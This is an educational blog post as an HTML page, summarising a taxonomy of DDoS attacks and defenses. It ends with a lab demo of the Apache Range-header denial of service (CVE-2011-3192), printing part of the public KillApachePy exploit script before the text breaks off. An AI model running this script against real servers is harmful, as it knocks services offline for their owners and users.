@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <title>Taxonomy of DDoS Attacks and DDoS Defense Mechanisms :: Drayko Escobar Blog - Passion for cybersecurity</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content=" A Distributed Denial of Service (DDoS) attack is carried out by generating a large flow of information from multiple connection points towards a single destination. In this post, two types of taxonomies will be presented to classify them by attacks and countermeasures, highlighting similarities, characteristics, and strategies with the aim of designing appropriate measures.
+Introduction
+The development and use of DDoS attack techniques have increased over time, and attackers constantly modify their approaches. This study aims to cover both well-known attacks and potential modifications, divided by levels.
+"
+/>
+<meta
+  name="keywords"
+  content="hugo, tailwind, tailwindcss, hugo theme, hugo theme tailwind"
+/>
+<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" /><meta property="og:url" content="https://drayko.github.io/post/taxonomy-of-ddos/">
+  <meta property="og:site_name" content="Drayko Escobar Blog">
+  <meta property="og:title" content="Taxonomy of DDoS Attacks and DDoS Defense Mechanisms">
+  <meta property="og:description" content="Based on the work of Jelena Mirkovic and Peter Reiher">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2020-05-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-05-30T00:00:00+00:00">
+    <meta property="article:tag" content="Networks">
+    <meta property="article:tag" content="Curiosities">
+    <meta property="article:tag" content="Network">
+    <meta property="article:tag" content="Paper">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Taxonomy of DDoS Attacks and DDoS Defense Mechanisms">
+  <meta name="twitter:description" content="Based on the work of Jelena Mirkovic and Peter Reiher">
+
+
+<link rel="canonical" href="https://drayko.github.io/post/taxonomy-of-ddos/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.min.b03d2d218fbbf7435f0f24ce5c248d756c4afb8f172e4ffa7d4cf167c7718286.css">
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-BMCGWX0MQ9"></script>
+      <script>
+        var doNotTrack = false;
+        
+        
+        
+        
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-BMCGWX0MQ9');
+        }
+      </script>
+
+
+
+
+  
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"Drayko Escobar"},"dateModified":"2020-05-30T00:00:00Z","datePublished":"2020-05-30T00:00:00Z","description":" A Distributed Denial of Service (DDoS) attack is carried out by generating a large flow of information from multiple connection points towards a single destination. In this post, two types of taxonomies will be presented to classify them by attacks and countermeasures, highlighting similarities, characteristics, and strategies with the aim of designing appropriate measures.\nIntroduction\nThe development and use of DDoS attack techniques have increased over time, and attackers constantly modify their approaches. This study aims to cover both well-known attacks and potential modifications, divided by levels.\n","image":"https://drayko.github.io/post/taxonomy-of-ddos/images/ddos.jpg","name":"Taxonomy of DDoS Attacks and DDoS Defense Mechanisms","url":"https://drayko.github.io/post/taxonomy-of-ddos/"}
+</script>
+
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/drayko_logo_ico.webp" alt="logo">
+    </a>
+  </div>
+  
+  <h1 class="hidden md:flex flex-col justify-center mx-2">
+    <a href="/" class="text-2xl font-semibold text-slate-800 dark:text-slate-200">
+      Drayko Escobar
+    </a>
+  </h1>
+  
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-xs md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/post/" title="Post">Post</a>
+        </li>
+      
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none">
+    <div class="h-full static">
+      <button id="navbar-lang-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+        <span class="sr-only">Open language switcher</span>
+        <i class="w-8 h-8">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c0 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+        </i>
+      </button>
+      <div class="absolute hidden top-16 z-50" id="navbar-lang">
+        <ul class="flex flex-col rounded-xs px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+          <li class="">
+            <span class="block px-3 py-3 cursor-default hover:text-emerald-600">English</span>
+            </li>
+        
+          <li class="">
+            <a class="block px-3 py-3 hover:text-emerald-600"
+              href="/es/post/taxonomy-of-ddos/" title="Español">Español</a></li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="relative flex items-center gap-1 px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="absolute z-10 w-15 h-8 rounded-full bg-white dark:bg-gray-700"></div>
+      <i class="h-6 w-6 z-20 ml-1 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:invisible">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+      </i>
+      <i class="h-6 w-6 z-20 mr-1 flex-none rounded-full place-self-center invisible peer-checked:visible">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+      </i>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div id="progress" class="fixed top-0 left-0 w-full h-1 bg-blue-500"></div>
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+    <div>
+      <a href="/post/taxonomy-of-ddos/">
+        <picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/ddos_hu_7caa9bfcc0090769.webp 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/ddos_hu_c3aa9bf197bb3d13.jpg 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/post/taxonomy-of-ddos/images/ddos_hu_4ac4be97511e7664.jpg" width="1200" height="675" alt="Taxonomy of DDoS Attacks and DDoS Defense Mechanisms" title="Taxonomy of DDoS Attacks and DDoS Defense Mechanisms" loading="lazy" />
+  </picture>
+      </a>
+    </div>
+    <div class="flex flex-col gap-y-3 p-6">
+      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+        <a href="/post/taxonomy-of-ddos/">Taxonomy of DDoS Attacks and DDoS Defense Mechanisms</a>
+      </h1>
+
+      
+      <h2 class="my-4 text-large text-slate-600 dark:text-slate-300">
+        Based on the work of Jelena Mirkovic and Peter Reiher
+      </h2>
+      
+      
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+    
+      
+      <li>
+        <a href="/tags/networks/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Networks</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/curiosities/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Curiosities</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/network/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Network</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/paper/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Paper</span>
+        </a>
+      </li>
+      
+    
+  </ul>
+
+
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2020-05-30T00:00:00&#43;00:00">
+      2020-05-30
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      6 minutes to read
+    </span>
+  </div>
+</div>
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+    class="icon icon-tabler icons-tabler-outline icon-tabler-user">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M8 7a4 4 0 1 0 8 0a4 4 0 0 0 -8 0" />
+    <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+    </i>
+    <span>Drayko Escobar</span>
+  </div>
+</div>
+
+      
+        
+        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+          <h2>Table of Contents</h2>
+          <aside><nav id="TableOfContents"></nav></aside>
+        </section>
+        
+      
+
+      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+        <blockquote>
+<p>A Distributed Denial of Service (DDoS) attack is carried out by generating a large flow of information from multiple connection points towards a single destination. In this post, two types of taxonomies will be presented to classify them by attacks and countermeasures, highlighting similarities, characteristics, and strategies with the aim of designing appropriate measures.</p></blockquote>
+<p><strong>Introduction</strong><br>
+The development and use of DDoS attack techniques have increased over time, and attackers constantly modify their approaches. This study aims to cover both well-known attacks and potential modifications, divided by levels.</p>
+<p><strong>General Aspects</strong><br>
+<em>What makes DDoS attacks possible?</em><br>
+Due to the design of the Internet following an end-to-end paradigm, in a two-way communication there is no intermediary that can immediately control or stop the transmission of malicious packets. Additionally, the possibility of performing IP Spoofing further complicates controlling these attacks without affecting genuine clients of the victim host.</p>
+<p><em>How are DDoS attacks carried out?</em><br>
+To begin, they consist of several phases. Usually, automated scanning is used to identify devices that may be vulnerable—in simple terms, this is the start of the recruitment process. Once identified, these devices are exploited or infected (typically automatically) to introduce malicious code, which will later be used to recruit even more devices. I would call this a pyramid scheme.</p>
+<p><em>Why are DDoS attacks carried out?</em><br>
+They are usually executed for personal reasons (revenge) or reputation (to gain respect and fame). However, they are also carried out for economic reasons (to harm a competitor) and political reasons (such as a war that could leave an entire country without internet services—an issue that Russia recently considered and is working on by improving its internet independence and implementing countermeasures).</p>
+<p><strong>Taxonomy of DDoS Attacks</strong><br>
+<em>DA: Degree of Automation (Grado de automatización)</em><br>
+<em>DA-1 Manual</em><br>
+The previously mentioned phases of scanning and exploitation are carried out entirely manually by the attacker.</p>
+<p><em>DA-2 Semi-Automatic</em></p>
+<p>&hellip;</p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/DDoS-Attack-Mechanisms_hu_a7b3fd66c70d9f92.webp 320w, /post/taxonomy-of-ddos/images/DDoS-Attack-Mechanisms_hu_c03efc8d7faea56c.webp 640w, /post/taxonomy-of-ddos/images/DDoS-Attack-Mechanisms_hu_2b532169dd71f1f5.webp 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/DDoS-Attack-Mechanisms_hu_fc0a4bb1dee54cae.jpg 320w, /post/taxonomy-of-ddos/images/DDoS-Attack-Mechanisms_hu_c1798d989d8b9887.jpg 640w, /post/taxonomy-of-ddos/images/DDoS-Attack-Mechanisms_hu_f6c5f2bc8512f728.jpg 960w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/taxonomy-of-ddos/images/DDoS-Attack-Mechanisms_hu_c1798d989d8b9887.jpg" width="1100" height="670" alt="DDoS-Attack-Mechanisms" title="DDoS-Attack-Mechanisms" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p><strong>Taxonomy of DDoS Defense Mechanisms</strong></p>
+<p><div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_f91547f9a5d4836b.webp 320w, /post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_21a1766d2caf46a3.webp 640w, /post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_ad8ddaf3822870cf.webp 960w, /post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_a37f5488163816d5.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_5f6a2ac1ac5ec62f.jpg 320w, /post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_62f813aaea85ffb0.jpg 640w, /post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_b68e10d69bcdff87.jpg 960w, /post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_9790fb1b5a664739.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/taxonomy-of-ddos/images/DoS-Defense-Mechanisms_hu_62f813aaea85ffb0.jpg" width="1349" height="634" alt="DoS-Defense-Mechanisms" title="DoS-Defense-Mechanisms" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p>For more details on each classification, refer to <a href="https://doi.org/10.1145/997150.997156" target="_blank" rel="noopener">this article</a>
+.</p>
+<hr>
+<p><strong>Demo Time | <em><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192" target="_blank" rel="noopener">CVE-2011-3192</a>
+</em></strong><br>
+To provide a practical example of a <em>DDoS</em> attack, consider the case study of the so-called <em><strong>ApacheKiller</strong></em> attack. This attack allows adversaries to cause a denial of service (through memory and CPU consumption) by exploiting the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests" target="_blank" rel="noopener"><code>Range</code> header</a>
+ that specifies multiple overlapping ranges, and it is assigned the identifier <code>CVE-2011-3192</code>.<br>
+Affected versions of Apache HTTP Server include <code>1.3.x</code>, <code>2.0.x</code> up to <code>2.0.64</code>, and <code>2.2.x</code> up to <code>2.2.19</code>. In my case, I used Windows 7 as the victim host running Apache <code>v2.2.15</code> along with a Python script to execute the attack.</p>
+<p><em>Step 1</em><br>
+Install and run a vulnerable version of Apache as described above.<div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/ddos_tax_1_hu_5d5dd48e18356b7.webp 320w, /post/taxonomy-of-ddos/images/ddos_tax_1_hu_3068cd38f958856f.webp 640w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/ddos_tax_1_hu_b3e17321d44a86de.jpg 320w, /post/taxonomy-of-ddos/images/ddos_tax_1_hu_73b94fac8475a94a.jpg 640w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/taxonomy-of-ddos/images/ddos_tax_1_hu_73b94fac8475a94a.jpg" width="799" height="494" alt="1" title="1" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p><em>Step 2</em><br>
+Perform a brief test so you can closely observe the request, which also reveals the version of Apache in use. In a paid test or bug bounty scenario, this information could be very useful.<div class="not-prose">
+<picture>
+    <source type="image/webp" srcset="/post/taxonomy-of-ddos/images/ddos_tax_2_hu_637fd434a172a19e.webp 320w, /post/taxonomy-of-ddos/images/ddos_tax_2_hu_6eba2e9e52738857.webp 640w, /post/taxonomy-of-ddos/images/ddos_tax_2_hu_2d1025af18103857.webp 960w, /post/taxonomy-of-ddos/images/ddos_tax_2_hu_b40b55d47319c789.webp 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <source type="image/jpeg" srcset="/post/taxonomy-of-ddos/images/ddos_tax_2_hu_f5cf5df85a7e0cb8.jpg 320w, /post/taxonomy-of-ddos/images/ddos_tax_2_hu_6ff487a0cfa6324c.jpg 640w, /post/taxonomy-of-ddos/images/ddos_tax_2_hu_2266847d18a252d3.jpg 960w, /post/taxonomy-of-ddos/images/ddos_tax_2_hu_913e905facfcbbb.jpg 1280w" sizes="(min-width: 1024px) 100vw, 50vw" />
+    <img class="h-auto max-w-full rounded-lg" src="/post/taxonomy-of-ddos/images/ddos_tax_2_hu_6ff487a0cfa6324c.jpg" width="1359" height="374" alt="2" title="2" loading="lazy" />
+  </picture>
+</div>
+</p>
+<p><em>Step 3</em><br>
+Using the Python script created by <em>Miroslav Stampar</em>, we perform the test:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">optparse</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">threading</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">urllib2</span><span class="o">,</span> <span class="nn">urlparse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NAME</span>        <span class="o">=</span> <span class="s2">&#34;KillApachePy (Range Header DoS CVE-2011-3192)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">VERSION</span>     <span class="o">=</span> <span class="s2">&#34;0.1c&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">AUTHOR</span>      <span class="o">=</span> <span class="s2">&#34;Miroslav Stampar (@stamparm)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LICENSE</span>     <span class="o">=</span> <span class="s2">&#34;Public domain (FREE)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SHORT</span>       <span class="o">=</span> <span class="s2">&#34;You&#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">REFERENCE</span>   <span class="o">=</span> <span class="s2">&#34;http://seclists.org/fulldisclosure/2011/Aug/175&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SLEEP_TIME</span>      <span class="o">=</span> <span class="mi">3</span>     <span class="c1"># time to wait for new thread slots (after max number reached)</span>
+</span></span><span class="line"><span class="cl"><span class="n">RANGE_NUMBER</span>    <span class="o">=</span> <span class="mi">1024</span>  <span class="c1"># number of range subitems forming the DoS payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">USER_AGENT</span>      <span class="o">=</span> <span class="s2">&#34;KillApachePy (</span><span class="si">%s</span><span class="s2">)&#34;</span> <span class="o">%</span> <span class="n">VERSION</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">user_agent</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">proxy</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;://&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">urlparse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">netloc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">user_agent</span> <span class="o">=</span> <span class="n">user_agent</span> <span class="ow">or</span> <span class="n">USER_AGENT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">proxy</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="s1">&#39;\Ahttp(s)?://[^:]+:[0-9]+(/)?\Z&#39;</span><span class="p">,</span> <span class="n">proxy</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;(x) Invalid proxy address used&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">proxy_support</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">ProxyHandler</span><span class="p">({</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">}</span> <span class="k">if</span> <span class="n">proxy</span> <span class="k">else</span> <span class="p">{})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">proxy_support</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">_MethodRequest</span><span class="p">(</span><span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">set_method</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">method</span><span class="p">):</span>
